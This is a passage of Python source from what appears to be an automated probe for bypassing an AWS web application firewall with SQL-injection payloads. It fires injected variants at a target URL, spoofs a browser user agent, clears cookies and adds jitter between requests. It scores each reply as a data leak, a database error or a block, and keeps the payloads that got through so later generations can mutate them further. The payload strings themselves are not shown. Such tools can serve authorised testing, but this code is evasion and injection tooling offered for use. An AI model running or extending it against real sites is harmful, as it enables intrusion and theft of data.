        for p in (
            RESULTS_JSONL,
            BYPASS_LEARNED_JSONL,
            BLOCKED_LEARNED_JSONL,
            OTHER_LEARNED_JSONL,
            BYPASS_FOUND_TXT,
        ):
            if p.exists():
                p.write_text("", encoding="utf-8")
        with open(LEARNED_ENCODINGS_JSON, "w", encoding="utf-8") as f:
            json.dump({"transforms": {}, "updated_ts": time.time()}, f, ensure_ascii=False, indent=2)

        tp_path = DATA_DIR / "transform_policy.json"
        if tp_path.exists():
            try:
                with open(tp_path, "r", encoding="utf-8") as f:
                    tp = json.load(f)
                tp["exclude"] = []
                with open(tp_path, "w", encoding="utf-8") as f:
                    json.dump(tp, f, ensure_ascii=False, indent=2)
                print("[FRESH] Reset transform_policy.json (cleared exclude list to prevent survivorship bias across runs).")
            except Exception as e:
                print(f"[WARN] Failed resetting transform_policy: {e}")

    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        **extra,
    }

    bypass_n = 0
    bypass_200_n = 0
    bypass_500_n = 0
    bypass_app_err_n = 0
    block_n = 0
    other_n = 0
    waf_pass_n = 0
    tested = 0
    status_hist: Counter[int] = Counter()
    report_lines: list[str] = []

    repeat_pv = int(cfg.get("repeat_per_variant") or 1)
    if ns.repeat_per_variant is not None:
        repeat_pv = int(ns.repeat_per_variant)
    repeat_pv = max(1, repeat_pv)
    if probe_mode == "full" and repeat_pv != 1:
        print(
            "repeat_per_variant>1 applies to probe_mode=variants only; ignoring for --full",
            file=sys.stderr,
        )
        repeat_pv = 1

    print(
        f"Session Run ID: {run_id}\n"
        f"Target: {base}  probe_mode={probe_mode}  inject={mode}  "
        f"({'param=' + param if mode == 'query' else 'path'})  "
        f"id_remap {old_id}->{new_id}  legacy={len(extra_pairs)}  "
        f"aws_extra={cfg.get('aws_extra_variants', True)}  "
        f"adv_mutate={cfg.get('adv_mutate_enabled', True)}  "
        f"sql={cfg.get('sql_dialect', 'postgresql')}  "
        f"{'max_gen=' + str(max_gen_cfg) + '  ' if probe_mode == 'full' else ''}"
        f"variants={len(variants) if probe_mode != 'full' else 'queue'}  "
        f"repeat_per_variant={repeat_pv}  sleep={sleep_s}  "
        f"clear_cookies={clear_cookies}  shuffle={shuffle_queue}"
    )

    learn_files = not ns.dry_run
    session = requests.Session() if not ns.dry_run else None
    session_detected_cookies: set[str] = set()

    cal = None
    if learn_files and cfg.get("calibration", True):
        cal = probe_calibration(base, mode, param, new_id, headers, session=session)
        print(
            f"Calibration (literal id only, no SQL): HTTP {cal.get('http_status')}  "
            f"hint={cal.get('hint')}",
            flush=True,
        )
        if cal.get("hint") == "project_not_found":
            print(
                "  Baseline 404 for id_remap.to: injections often return app 404; "
                "that counts as waf_passed, not effective bypass.",
                flush=True,
            )
        if cal.get("hint") == "waf_blocked":
            print(
                "  Baseline blocked by WAF: literal project param may be denied.",
                flush=True,
            )

        if session and session.cookies:
            for c in session.cookies:
                session_detected_cookies.add(f"{c.name}={c.value[:10]}...")
            if clear_cookies:
                session.cookies.clear()

    # Fix P0 Item 1: Robust save_results accepting run_id and **kwargs safely
    def save_results(
        b_n,
        bl_n,
        o_n,
        wp_n,
        hist,
        tested_count,
        r_lines,
        b_200_n=0,
        b_500_n=0,
        b_app_n=0,
        gen0_baseline=None,
        adaptive_spawn=None,
        gen_breakdown=None,
        cal_history=None,
        cookies_detected=None,
        cookie_policy="clear_per_request",
        run_id=run_id,
        run_id_val=None,
        **kwargs,
    ):
        effective_run_id = run_id_val or run_id
        bypass_200_rate = round(b_200_n / tested_count, 4) if tested_count else 0.0
        bypass_total_rate = round(b_n / tested_count, 4) if tested_count else 0.0
        block_rate = round(bl_n / tested_count, 4) if tested_count else 0.0

        summary = {
            "run_id": effective_run_id,
            "ts": time.time(),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "base_url": base,
            "inject_mode": mode,
            "query_param": param,
            "id_remap": {"from": old_id, "to": new_id},
            "id_remap_legacy": [{"from": a, "to": b} for a, b in extra_pairs],
            "sql_dialect": cfg.get("sql_dialect", "postgresql"),
            "raw_payload": raw,
            "repeat_per_variant": repeat_pv if probe_mode != "full" else 1,
            "variants_tested": tested_count if not ns.dry_run else 0,
            "bypass_200_only": b_200_n,
            "bypass_500_only": b_500_n,
            "bypass_app_err": b_app_n,
            "bypass_total": b_n,
            "bypass": b_n,
            "bypass_200_rate": bypass_200_rate,
            "bypass_total_rate": bypass_total_rate,
            "blocked": bl_n,
            "block_rate": block_rate,
            "waf_passed": wp_n,
            "other_or_error": o_n,
            "http_status_counts": dict(sorted(hist.items())),
            "cookie_policy": cookie_policy,
            "cookies_detected": cookies_detected or list(session_detected_cookies),
            "gen0_baseline": gen0_baseline or {},
            "adaptive_spawn_stats": adaptive_spawn or {},
            "generation_breakdown": gen_breakdown or {},
            "calibration": cal,
            "calibration_history": cal_history or [],
            "config": str(ns.config.resolve()),
            "bypass_learned_jsonl": str(BYPASS_LEARNED_JSONL.resolve()),
            "blocked_learned_jsonl": str(BLOCKED_LEARNED_JSONL.resolve()),
            "other_learned_jsonl": str(OTHER_LEARNED_JSONL.resolve()),
            "learned_encodings_json": str(LEARNED_ENCODINGS_JSON.resolve()),
            "report_txt": str(REPORT_TXT.resolve()),
            "bypass_found_txt": str(BYPASS_FOUND_TXT.resolve()),
        }
        if not ns.dry_run:
            with open(SUMMARY_JSON, "w", encoding="utf-8") as f:
                json.dump(summary, f, ensure_ascii=False, indent=2)

            hdr = [
                "AWS WAF Adversarial Probe Report",
                "=" * 65,
                f"Run ID: {effective_run_id}",
                f"Generated: {datetime.now(timezone.utc).isoformat()}",
                f"Target URL: {base}",
                f"SQL Dialect: {cfg.get('sql_dialect', 'postgresql')}",
                f"Cookie Policy: {cookie_policy} (cookies detected: {len(cookies_detected or [])})",
                "-" * 65,
                f"Variants Tested: {tested_count}",
                f"Bypass (200 OK data leak):       {b_200_n:5} ({bypass_200_rate:.1%})",
                f"Bypass (500 DB syntax error):    {b_500_n:5}",
                f"Bypass (400/422 origin reach):   {b_app_n:5}",
                f"Bypass (Total Effective):        {b_n:5} ({bypass_total_rate:.1%})",
                f"Blocked (WAF/Edge 403):          {bl_n:5} ({block_rate:.1%})",
                f"WAF Passed (non-WAF denial):     {wp_n:5}",
                f"Other / Error:                   {o_n:5}",
                f"HTTP Status Codes:               {dict(sorted(hist.items()))}",
            ]

            if gen0_baseline and gen0_baseline.get("tested"):
                g0_t = gen0_baseline.get("tested", 0)
                g0_200_r = gen0_baseline.get("bypass_200", 0) / g0_t if g0_t else 0.0
                g0_tot_r = gen0_baseline.get("bypass_total", 0) / g0_t if g0_t else 0.0
                hdr.extend([
                    "-" * 65,
                    "Generation 0 Baseline (Pure unadapted seeds):",
                    f"  Gen 0 Tested:                  {g0_t}",
                    f"  Gen 0 Bypass 200 OK:           {gen0_baseline.get('bypass_200', 0)} ({g0_200_r:.1%})",
                    f"  Gen 0 Total Bypass:            {gen0_baseline.get('bypass_total', 0)} ({g0_tot_r:.1%})",
                    f"  Overall Evolutionary Gain (200 OK): {bypass_200_rate - g0_200_r:+.1%}",
                    f"  Overall Evolutionary Gain (Total) : {bypass_total_rate - g0_tot_r:+.1%}",
                ])

            if adaptive_spawn and adaptive_spawn.get("tested"):
                sp_t = adaptive_spawn.get("tested", 0)
                sp_200_r = adaptive_spawn.get("bypass_200", 0) / sp_t if sp_t else 0.0
                sp_tot_r = adaptive_spawn.get("bypass_total", 0) / sp_t if sp_t else 0.0
                hdr.extend([
                    "-" * 65,
                    "Adaptive Spawned Children (Mutated from successful bypasses):",
                    f"  Spawned Tested:                {sp_t}",
                    f"  Spawned Bypass 200 OK:         {adaptive_spawn.get('bypass_200', 0)} ({sp_200_r:.1%})",
                    f"  Spawned Total Bypass:          {adaptive_spawn.get('bypass_total', 0)} ({sp_tot_r:.1%})",
                ])

            hdr.extend([
                "=" * 65,
                "",
                "Definitions:",
                "  - bypass_200_only: HTTP 200 with verified backend project entity data.",
                "  - bypass_500_only: Unhandled PostgreSQL exception reaching database layer.",
                "  - bypass_total: Sum of 200 OK, unhandled 500, and 400/422 origin reach.",
                "  - blocked: Explicit WAF/Edge rejection (403/406/429 or WAF block template).",
                "",
            ])
            REPORT_TXT.write_text("\n".join(hdr + r_lines) + "\n", encoding="utf-8")

    # Mode 1: Full transform / evolution probe
    if probe_mode == "full" and learn_files:
        with open(RESULTS_JSONL, "a", encoding="utf-8") as fout:
            (
                bypass_n,
                block_n,
                other_n,
                waf_pass_n,
                status_hist,
                report_lines,
                tested,
                detailed_stats,
            ) = run_full_transform_probe(
                base,
                mode,
                param,
                raw,
                old_id,
                new_id,
                headers,
                sleep_s,
                int(max_r) if max_r is not None else None,
                max_gen_cfg,
                fout,
                extra_pairs,
                cfg.get("aws_extra_variants", True),
                int(cfg.get("aws_extra_max") or 120),
                cfg.get("sql_dialect", "postgresql"),
                cfg.get("adv_mutate_enabled", True),
                int(cfg.get("adv_mutate_max") or 80),
                cfg.get("adv_second_layer", True),
                int(cfg.get("adv_second_layer_max") or 50),
                checkpoint_fn=save_results,
                session=session,
                run_id=run_id,
                clear_cookies=clear_cookies,
                shuffle_queue=shuffle_queue,
                cal_interval=cal_interval,
                initial_cal=cal,  # Fix P1 Item 6
                calibration_enabled=cfg.get("calibration", True),
            )

        bypass_200_n = detailed_stats["bypass_200_n"]
        bypass_500_n = detailed_stats["bypass_500_n"]
        bypass_app_err_n = detailed_stats["bypass_app_err_n"]
        gen0_baseline_data = detailed_stats["gen0_baseline"]
        adaptive_spawn_data = detailed_stats.get("adaptive_spawn", {})
        gen_breakdown_data = detailed_stats["gen_breakdown"]
        cal_history_data = detailed_stats["cal_history"]
        cookies_det_data = detailed_stats["cookies_detected"]

    # Mode 2: Static variants probe
    if probe_mode != "full":
        seen_payloads = set()
        cookie_logged = False
        with open(RESULTS_JSONL, "a", encoding="utf-8") as fout, (
            open(BYPASS_LEARNED_JSONL, "a", encoding="utf-8")
            if learn_files
            else open(os.devnull, "w")
        ) as fbypass, (
            open(BLOCKED_LEARNED_JSONL, "a", encoding="utf-8")
            if learn_files
            else open(os.devnull, "w")
        ) as fblocked, (
            open(OTHER_LEARNED_JSONL, "a", encoding="utf-8")
            if learn_files
            else open(os.devnull, "w")
        ) as fother:
            for payload, name in variants:
                if payload in seen_payloads:
                    continue
                seen_payloads.add(payload)
                for trial in range(repeat_pv):
                    if mode == "query":
                        url = build_url_query(base, param, payload)
                    else:
                        url = build_url_path(base, payload)
                    if ns.dry_run:
                        if trial == 0:
                            print(url[:200] + ("..." if len(url) > 200 else ""))
                        continue

                    http = session or requests
                    now_ts = time.time()
                    now_iso = datetime.now(timezone.utc).isoformat()

                    try:
                        r = http.get(url, headers=headers, timeout=20, allow_redirects=True)
                    except requests.RequestException as e:
                        rec = {
                            "run_id": run_id,
                            "variant": name,
                            "gen": 0,
                            "source": "static_variants",
                            "trial": trial,
                            "trials_total": repeat_pv,
                            "http_status": None,
                            "result": "error",
                            "error": str(e)[:400],
                            "headers": {},
                            "url_snip": url[:300],
                            "ts": now_ts,
                            "timestamp": now_iso,
                        }
                        fout.write(json.dumps(rec, ensure_ascii=False) + "\n")
                        other_n += 1
                        tested += 1
                        sleep_with_jitter(sleep_s)
                        continue

                    if session and session.cookies:
                        c_names = set(session.cookies.keys())
                        if not cookie_logged and c_names:
                            cookie_logged = True
                            print(
                                f"  [COOKIE DETECTED] Server set cookies: {dict(session.cookies)}. "
                                f"Policy: {'CLEAR after request' if clear_cookies else 'RETAIN'}",
                                flush=True,
                            )
                        session_detected_cookies.update(c_names)
                        if clear_cookies:
                            session.cookies.clear()

                    res, detail = classify_result(r)
                    bp = res == "bypass"
                    status_hist[r.status_code] += 1

                    if res == "bypass":
                        bypass_n += 1
                        if detail == "ok_200":
                            bypass_200_n += 1
                        elif detail == "http_500":
                            bypass_500_n += 1
                        else:
                            bypass_app_err_n += 1
                    elif res == "blocked":
                        block_n += 1
                    else:
                        other_n += 1

                    if res != "blocked":
                        waf_pass_n += 1

                    # Fix P0 Item 4: Capture edge headers
                    edge_headers = extract_edge_headers(r)

                    rec = {
                        "run_id": run_id,
                        "variant": name,
                        "gen": 0,
                        "source": "static_variants",
                        "trial": trial,
                        "trials_total": repeat_pv,
                        "http_status": r.status_code,
                        "result": res,
                        "result_detail": detail,
                        "waf_passed": res != "blocked",
                        "headers": edge_headers,
                        "url_snip": url[:400],
                        "body_snip": (r.text or "")[:240].replace("\n", " "),
                        "ts": now_ts,
                        "timestamp": now_iso,
                    }
                    fout.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    tested += 1
                    report_lines.append(
                        f"{res.upper():8}  HTTP {r.status_code:3}  t{trial + 1}/{repeat_pv}  {name}  ({detail})"
                    )

                    if learn_files and trial == repeat_pv - 1:
                        if bp:
                            fbypass.write(
                                json.dumps(
                                    {
                                        "run_id": run_id,
                                        "payload": payload,
                                        "name": name,
                                        "gen": 0,
                                        "source": "static_variants",
                                        "ts": now_ts,
                                        "timestamp": now_iso,
                                    },
                                    ensure_ascii=False,
                                )
                                + "\n"
                            )
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "bypass",
                            )
                        elif res == "blocked":
                            fblocked.write(
                                json.dumps(
                                    {
                                        "run_id": run_id,
                                        "payload": payload,
                                        "name": name,
                                        "gen": 0,
                                        "source": "static_variants",
                                        "status": "blocked",
                                        "status_code": r.status_code,
                                        "ts": now_ts,
                                        "timestamp": now_iso,
                                    },
                                    ensure_ascii=False,
                                )
                                + "\n"
                            )
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "block",
                            )
                        elif detail in OTHER_LEARNED_DETAILS:
                            fother.write(
                                json.dumps(
                                    {
                                        "run_id": run_id,
                                        "payload": payload,
                                        "name": name,
                                        "gen": 0,
                                        "source": "static_variants",
                                        "status": "other",
                                        "result_detail": detail,
                                        "status_code": r.status_code,
                                        "ts": now_ts,
                                        "timestamp": now_iso,
                                    },
                                    ensure_ascii=False,
                                )
                                + "\n"
                            )
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "other",
                            )
                        if res != "blocked":
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "reach",
                            )

                    print(
                        f"  [{tested}] {res.upper():8}  t{trial + 1}/{repeat_pv}  {name:22}  HTTP {r.status_code}  ({detail})",
                        flush=True,
                    )
                    sleep_with_jitter(sleep_s)

        gen0_baseline_data = {
            "tested": tested,
            "bypass_200": bypass_200_n,
            "bypass_500": bypass_500_n,
            "bypass_app_err": bypass_app_err_n,
            "bypass_total": bypass_n,
            "bypass_200_rate": round(bypass_200_n / tested, 4) if tested else 0.0,
            "bypass_total_rate": round(bypass_n / tested, 4) if tested else 0.0,
            "blocked": block_n,
            "block_rate": round(block_n / tested, 4) if tested else 0.0,
            "waf_passed": waf_pass_n,
            "other": other_n,
        }
        adaptive_spawn_data = {}
        gen_breakdown_data = {"0": gen0_baseline_data}
        cal_history_data = [cal] if cal else []
        cookies_det_data = list(session_detected_cookies)

    # Save final results
    save_results(
        bypass_n,
        block_n,
        other_n,
        waf_pass_n,
        status_hist,
        tested,
        report_lines,
        b_200_n=bypass_200_n,
        b_500_n=bypass_500_n,
        b_app_n=bypass_app_err_n,
        gen0_baseline=gen0_baseline_data,
        adaptive_spawn=adaptive_spawn_data,
        gen_breakdown=gen_breakdown_data,
        cal_history=cal_history_data,
        cookies_detected=cookies_det_data,
        cookie_policy="clear_per_request" if clear_cookies else "retain_session",
        run_id=run_id,
    )

    if not ns.dry_run:
        print("\n" + "=" * 65)
        print(f"PROBE COMPLETED (Run ID: {run_id})")
        print("=" * 65)
        print(f"Total Variants Tested:        {tested}")
        print(f"Bypass (200 OK data leak):    {bypass_200_n:5} ({(bypass_200_n/tested*100) if tested else 0:.1f}%)")
        print(f"Bypass (500 DB syntax error): {bypass_500_n:5} ({(bypass_500_n/tested*100) if tested else 0:.1f}%)")
        print(f"Bypass (400/422 origin reach):{bypass_app_err_n:5}")
        print(f"Bypass Total (Passed WAF):    {bypass_n:5} ({(bypass_n/tested*100) if tested else 0:.1f}%)")
        print(f"Blocked by WAF / Edge:        {block_n:5} ({(block_n/tested*100) if tested else 0:.1f}%)")
        print(f"WAF Passed (non-WAF denial):  {waf_pass_n:5}")
        print(f"Other / Connection Errors:    {other_n:5}")
        print(f"HTTP Status Breakdown:        {dict(sorted(status_hist.items()))}")

        if gen0_baseline_data and gen0_baseline_data.get("tested"):
            g0_200 = gen0_baseline_data.get("bypass_200_rate", 0.0)
            g0_tot = gen0_baseline_data.get("bypass_total_rate", 0.0)
            curr_200 = (bypass_200_n / tested) if tested else 0.0
            curr_tot = (bypass_n / tested) if tested else 0.0
            print("-" * 65)
            print(f"Gen 0 Pure Baseline Bypass 200: {g0_200*100:.1f}%")
            print(f"Final Bypass 200 Rate:          {curr_200*100:.1f}%")
            print(f"Evolutionary Gain (200 OK):     {(curr_200 - g0_200)*100:+.1f}%")
            print(f"Evolutionary Gain (Total):      {(curr_tot - g0_tot)*100:+.1f}%")

        if adaptive_spawn_data and adaptive_spawn_data.get("tested"):
            sp_200 = adaptive_spawn_data.get("bypass_200_rate", 0.0)
            sp_tot = adaptive_spawn_data.get("bypass_total_rate", 0.0)
            print("-" * 65)
            print(f"Adaptive Spawned Tested:        {adaptive_spawn_data.get('tested')}")
            print(f"Adaptive Spawned Bypass 200:    {sp_200*100:.1f}%")
            print(f"Adaptive Spawned Total Bypass:  {sp_tot*100:.1f}%")
        print("=" * 65)
        print(f"Results JSONL:    {RESULTS_JSONL.resolve()}")
        print(f"Summary JSON:     {SUMMARY_JSON.resolve()}")
        print(f"Report Text:      {REPORT_TXT.resolve()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
